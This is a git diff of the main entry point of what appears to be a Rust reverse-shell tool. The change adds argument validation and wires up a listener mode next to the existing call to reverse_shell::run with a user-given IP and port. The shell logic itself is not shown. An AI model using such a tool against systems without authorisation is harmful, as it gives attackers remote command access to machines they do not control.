@@ -1,5 +1,5 @@
-use cli::Args;
 use clap::Parser;
+use cli::Args;
 
 mod cli;
 mod listener;
@@ -8,19 +8,31 @@ mod errors;
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
-    let args = Args::parse();
+	let args = Args::parse();
+	let ip: &str = args.address.as_str();
+	let port: u16 = args.port;
 
-    if args.listen {
-        todo!()
-    } else {
-        let ip: &str = args.address.as_str();
-        let port: u16 = args.port;
-        match reverse_shell::run(ip, port).await {
-            Ok(_) => Ok(()),
-            Err(e) => {
-                eprintln!("Error: {}", e);
-                Err(e)
-            }
-        }
-    }
+	if ip.is_empty() {
+		return Err(errors::CLIError::EmptyArgument { arg: String::from("address, -a") }.into());
+	} else if args.listen && ip != "127.0.0.1" {
+		return Err(errors::CLIError::IncompatibleArgs.into());
+	}
+
+	if args.listen {
+		match listener::listen(ip, port).await {
+			Ok(_) => Ok(()),
+			Err(e) => {
+				eprintln!("Error: {}", e);
+				Err(e)
+			}
+		}
+	} else {
+		match reverse_shell::run(ip, port).await {
+			Ok(_) => Ok(()),
+			Err(e) => {
+				eprintln!("Error: {}", e);
+				Err(e)
+			}
+		}
+	}
 }
